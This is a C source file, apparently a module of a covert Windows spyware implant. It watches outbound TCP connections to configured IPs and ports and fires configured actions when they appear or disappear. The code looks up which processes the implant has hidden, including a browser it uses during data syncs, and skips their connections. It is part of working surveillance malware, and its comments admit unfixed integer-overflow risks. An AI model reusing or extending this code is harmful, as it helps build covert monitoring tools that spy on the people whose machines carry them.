#include <Windows.h>
#include <cJSON/cJSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// MONITOR DELLE CONNESSIONI
#include <Iphlpapi.h>
typedef DWORD(WINAPI* GetIpAddrTable_t)(PMIB_IPADDRTABLE, PULONG, BOOL);
typedef DWORD(WINAPI* GetTcpTable_t)(PMIB_TCPTABLE_OWNER_PID, PDWORD, BOOL, ULONG, TCP_TABLE_CLASS, ULONG);


typedef struct {
	DWORD ip_address;
	DWORD netmask;
	DWORD port;
	BOOL present;
	EVENT_PARAM event_param;
	DWORD event_id;
} MONITORED_CONN;

#define EM_MC_SLEEPTIME 300

static HANDLE em_mc_monconn_thread = 0;
static DWORD maxEvent = 0;
static MONITORED_CONN* em_mc_connection_table = NULL;
static MIB_IPADDRTABLE* em_mc_localip = NULL;
static HMODULE h_iphlp = NULL;
static GetIpAddrTable_t pGetIpAddrTable = NULL;
static GetTcpTable_t pGetTcpTable = NULL;
static BOOL em_mc_cp = FALSE;

// Inizializza la tabella degli indirizzi locali 
void InitIPAddrLocal()
{
	DWORD dwSize;

	// Alloca e verifica
	SAFE_FREE(em_mc_localip);
	if (!(em_mc_localip = (MIB_IPADDRTABLE*)malloc(sizeof(MIB_IPADDRTABLE))))
		return;

	dwSize = 0;
	// XXX La verifica che il puntatore pGetIpAddrTable sia valorizzato, viene
	// fatta dal chiamante.
	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
		SAFE_FREE(em_mc_localip);
		if (!(em_mc_localip = (MIB_IPADDRTABLE*)malloc((UINT)dwSize)))
			return;
	}

	if (pGetIpAddrTable(em_mc_localip, &dwSize, FALSE) != NO_ERROR)
		SAFE_FREE(em_mc_localip);
}

// Torna TRUE se i due IP sono nella stessa subnet
BOOL IPNetCmp(DWORD ip1, DWORD ip2, DWORD netmask)
{
	ip1 &= netmask;
	ip2 &= netmask;
	if (ip1 == ip2)
		return TRUE;
	else
		return FALSE;
}

// Torna TRUE se ip_addr e' nella LAN
BOOL IPAddrIsLocal(DWORD ip_addr)
{
	DWORD i;

	// Controlla che la tabella degli indirizzi sia 
	// stata allocata
	if (!em_mc_localip)
		return FALSE;

	for (i = 0; i < em_mc_localip->dwNumEntries; i++)
		if ((em_mc_localip->table[i].dwAddr & em_mc_localip->table[i].dwMask) ==
			(ip_addr & em_mc_localip->table[i].dwMask) && em_mc_localip->table[i].dwMask)
			return TRUE;

	return FALSE;
}


DWORD MonitorConnection(DWORD dummy)
{
	PMIB_TCPTABLE_OWNER_PID pTcpTable;
	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
	DWORD i, j, dwSize;
	BOOL conn_found;

	// Se non e' stata inizializzata, carica iphlpapi.dll.
	// Lo fa una volta sola.
	if (!h_iphlp) {
		if ((h_iphlp = LoadLibrary("iphlpapi.dll"))) {
			pGetIpAddrTable = (GetIpAddrTable_t)HM_SafeGetProcAddress(h_iphlp, "GetIpAddrTable");
			pGetTcpTable = (GetTcpTable_t)HM_SafeGetProcAddress(h_iphlp, "GetExtendedTcpTable");
		}
	}

	LOOP{
		CANCELLATION_POINT(em_mc_cp);

	// Verifica di avere le funzioni che servono, altrimenti non fa nulla
	// e aspetta solo di terminare
	if (!pGetTcpTable || !pGetIpAddrTable) {
		Sleep(EM_MC_SLEEPTIME);
		continue;
	}

	// Lo fa ogni volta perche' l'indirizzo potrebbe non essere disponibile da suibito (es:dhcp)
	// o la macchina potrebbe non essere collegata in rete, o l'utente potrebbe riconfigurarlo a mano
	InitIPAddrLocal();

	dwSize = sizeof(MIB_TCPTABLE_OWNER_PID);
	pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc(sizeof(MIB_TCPTABLE_OWNER_PID));
	if (!pTcpTable)
		continue;

	// Legge la quantita' di memoria necessaria a contenere la tabella
	if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == ERROR_INSUFFICIENT_BUFFER) {
		SAFE_FREE(pTcpTable);
		pTcpTable = (MIB_TCPTABLE_OWNER_PID*)malloc((UINT)dwSize);
		if (!pTcpTable) {
			Sleep(EM_MC_SLEEPTIME);
			continue;
		}
	}

	// Ottiene la tabella delle connessionei TCP
	if (pGetTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_CONNECTIONS, 0) == NO_ERROR) {
		// Cicla le connessioni da monitorare
		for (i = 0; i < maxEvent; i++) {
			conn_found = FALSE;
			// Cicla le connessioni stabilite
			for (j = 0; j < pTcpTable->dwNumEntries; j++) {
				// Non considera le connessioni fatte dai processi nascosti da noi
				// (ad esempio quelle di iexplorer durante la sync)
				SET_PID_HIDE_STRUCT(pid_hide, pTcpTable->table[j].dwOwningPid);
				if (AM_IsHidden(HIDE_PID, &pid_hide))
					continue;

				// Controlla solo le connessioni attive e non verso la LAN
				if (pTcpTable->table[j].dwState != MIB_TCP_STATE_LISTEN &&
					pTcpTable->table[j].dwState != MIB_TCP_STATE_TIME_WAIT &&
					!IPAddrIsLocal(pTcpTable->table[j].dwRemoteAddr)) {
					// Controlla che IP e porta da monitorare siano nulli (wildcard) o uguali a 
					// quelli della connessione attualmente in esame.  
					if ((!em_mc_connection_table[i].ip_address || IPNetCmp(em_mc_connection_table[i].ip_address, pTcpTable->table[j].dwRemoteAddr, em_mc_connection_table[i].netmask)) &&
						(!em_mc_connection_table[i].port || em_mc_connection_table[i].port == htons(pTcpTable->table[j].dwRemotePort))) {
						// Controlla che la connessione non sia stata gia' rilevata
						// in un precedente ciclo
						if (!em_mc_connection_table[i].present) {
							em_mc_connection_table[i].present = TRUE;
							TriggerEvent(em_mc_connection_table[i].event_param.start_action, em_mc_connection_table[i].event_id);
							CreateRepeatThread(em_mc_connection_table[i].event_id, em_mc_connection_table[i].event_param.repeat_action, em_mc_connection_table[i].event_param.count, em_mc_connection_table[i].event_param.delay);
						}
						conn_found = TRUE;
						break;
					}
				}
			}
			// Se la connessione era stata rilevata come presente, ma adesso non lo e' piu',
			// aggiorna la tabella
			if (em_mc_connection_table[i].present && !conn_found) {
				em_mc_connection_table[i].present = FALSE;
				StopRepeatThread(em_mc_connection_table[i].event_id);
				TriggerEvent(em_mc_connection_table[i].event_param.stop_action, em_mc_connection_table[i].event_id);
			}
		}
	}

	SAFE_FREE(pTcpTable);
	Sleep(EM_MC_SLEEPTIME);
	}

		// not reached
	return 0;
}


void WINAPI EM_MonConnAdd(cJSON* conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;
	DWORD port;
	char ip_addr[64], netmask[64];

	// XXX...altro piccolo ed improbabile int overflow....
	if (!(temp_table = realloc(em_mc_connection_table, (maxEvent + 1) * sizeof(MONITORED_CONN))))
		return;

	sprintf_s(ip_addr, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "ip")));
	sprintf_s(netmask, "%s", cJSON_GetStringValue(cJSON_GetObjectItem(conf_json, "netmask")));
	
	if (cJSON_GetObjectItem(conf_json, "ip"))
		port = cJSON_GetNumberValue(cJSON_GetObjectItem(conf_json, "port"));
	else
		port = 0;

	em_mc_connection_table = (MONITORED_CONN*)temp_table;
	memcpy(&em_mc_connection_table[maxEvent].event_param, event_param, sizeof(EVENT_PARAM));
	em_mc_connection_table[maxEvent].event_id = event_id;
	em_mc_connection_table[maxEvent].ip_address = inet_addr(ip_addr);
	em_mc_connection_table[maxEvent].netmask = inet_addr(netmask);
	em_mc_connection_table[maxEvent].port = port;
	em_mc_connection_table[maxEvent].present = FALSE;

	maxEvent++;
}


void WINAPI EM_MonConnStart()
{
	DWORD dummy;
	// Crea il thread solo se ci sono connessioni da monitorare
	if (maxEvent > 0)
		em_mc_monconn_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorConnection, NULL, 0, &dummy);
}

void WINAPI EM_MonConnStop()
{
	QUERY_CANCELLATION(em_mc_monconn_thread, em_mc_cp);

	// Cancella tutti i thread di repeat
	for (DWORD i = 0; i < maxEvent; i++)
		StopRepeatThread(em_mc_connection_table[i].event_id);

	SAFE_FREE(em_mc_connection_table);
	SAFE_FREE(em_mc_localip);
	maxEvent = 0;
}
